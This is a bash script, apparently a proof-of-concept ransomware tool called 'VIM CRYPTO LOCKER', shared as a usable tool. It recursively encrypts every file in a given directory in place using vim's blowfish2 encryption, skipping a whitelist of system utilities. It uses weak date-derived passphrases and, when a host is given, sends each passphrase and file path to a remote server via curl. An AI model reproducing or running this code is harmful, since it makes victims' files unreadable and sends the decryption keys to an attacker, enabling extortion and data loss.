#!/bin/bash
# Kent 'picat' Gruber

# help_menu() provides a help menu
# for this application by echoing the
# available options out to the screen
help_menu() {
  echo -e "VIM CRYPTO LOCKER - What could go wrong?\n
  Typical use case: 
  EX: ./vimlocker.sh -H 192.168.1.2 -P 80 -d directory -B -e reallystrongpassword 
  Experimental use case:
  EX: ./vimlocker.sh -H 192.168.1.2 -P 80 -d directory -n 

  OPTIONS:
  -H <IP>\tHost ip to send encrpytion information to.
  -P <PORT>\tHost port to send encrpytion information to.
  -e <PASS>\tSet passphrase for file ( one is generated by default ).
  -l <FILE>\tLog application actions to a file ( off by default ).
  -z\t\tUse zip ( not great ) style encryption.
  -b\t\tUse vim's blowfish ( good ) encryption.
  -B\t\tUse vim's blowfish2 ( most goodiest )encryption.
  -n\t\tGenerate a new passphrase for each file.
  -v\t\tDisplay version.
  -s\t\tSilent mode.
  -h\t\tDisplay this menu. 
  "
}

# If not arguments are provided, then do ahead
# and default to a nice little help menu.
if [ $# -eq 0 ]; then
  #echo "No arguments supplied!"
  help_menu
  exit 1
fi

# Set defaults
host_given=false
port_give=false
passphrase_given=false
directory_given=false
encryption_given=false
random_given=false
new_each_given=false
log_given=false

# version() provides a simple means of checking
# the version of the application.
function version() {
echo "Version 1.0"
}

function parseOpts() {
while getopts h,p,r,z,b,B,d:,l:,e:,H:,P: opt; do
  case $opt in
    h) # Help
      help_menu
      exit 0
      ;;
    v|V) # Version check 
      version
      exit 0
      ;;
    H) # Host ip to send information to
      host="$OPTARG"
      host_given=true
      ;;
    P) # Host port to send information to
      port="$OPTARG"
      port_given=true
      ;;
    e) # Set passphrase to use
      passphrase="$OPTARG"
      passphrase_given=true
      ;;
    d) # Directory to encrypt
      directory="$OPTARG"
      directory_given=true
      ;;
    l) # Log file to use
      log="$OPTARG"
      log_given=true
      ;;
    r) # Use random encryption for each
      random_given=true
      ;;
    n) # New password each file
      #new_each=true
      new_each_given=true
      ;;
    z) # Zip encryption type
      encryption="zip"
      encryption_given=true
      ;;
    b) # Blow encryption type
      encryption="blowfish"
      encryption_given=true
      ;;
    B) # Blow encryption type
      encryption="blowfish2"
      encryption_given=true
      ;;
    \?) # Invalid arg
      echo "Invalid option: -$OPTARG"
      help_menu
      exit 1
      ;;
    :) # Missing arg
      echo "An argument must be specified for -$OPTARG"
      help_menu
      exit 1
      ;;
  esac
done
}

# Parse Arguments
parseOpts "$@"

# Check directory options
if $directory_given == false ; then
  if [ ! -d $directory ]; then
    echo "Error: $directory dosen't seem to be a directory!"
    exit 1
  fi
else
  echo "Error: No directory specified with the -d option!"
  exit 1
fi

# Check encryption options
if $encryption_given; then
  echo "[*] Encryption method set to $encryption"
else
  echo "[*] Setting blowfish2 as the encryption method."
  encryption="blowfish2"
fi

# Check host options
if $host_given; then
  echo "[*] host set to $host"
  if $port_given; then 
    echo "[*] host port set to $port"
  else
    echo "[*] No port set for host connection."
    echo "[*] Setting to 80 as a default."
    port="80"
  fi
fi

# Check passphrase options
if $passphrase_given; then
  echo "[*] Passphrase set to $passphrase"
else
  if $new_each_given; then 
    echo "[*] A new passphrase will be generated for each file."
  else
    passphrase=$(date | md5sum | awk '{print $1}')
    echo "[*] Passphrase set to: $passphrase"
  fi
fi

# Some applications will remain intact 
protected_applications=( cat wall echo bash ifconfig ls chmod rm openssl )
white_list=$(printf '%s|' "${protected_applications[@]}")
#white_list="$(printf '%s\n' "${protected_applications[@]}" | paste -sd '|')"

# Files to iterate through
files=$(find $directory -type f)

# Iterate through files
for file in $files
do
  # Skip over files which match the application white list
  if [[ ! $file =~ $white_list ]]; then
    # outfile=$f.lol
    # `openssl enc -aes-256-cbc -a -salt -in $f -out $outfile -pass pass:$pass -iv $iv`
    # rm $f
    echo "ENCRYPTING FILE : $file"
    if $new_each_given; then
      passphrase=$(date | md5sum | awk '{print $1}')
    fi
    if $host_given; then
      curl --data "passphrase=$passphrase&file=$file" https://$host:$port 
    fi
    vim --cmd "set key=$passphrase" --cmd "set cm=$encryption" -c wq $file 
  else
    echo "FOUND MATCH : $file"
  fi
done

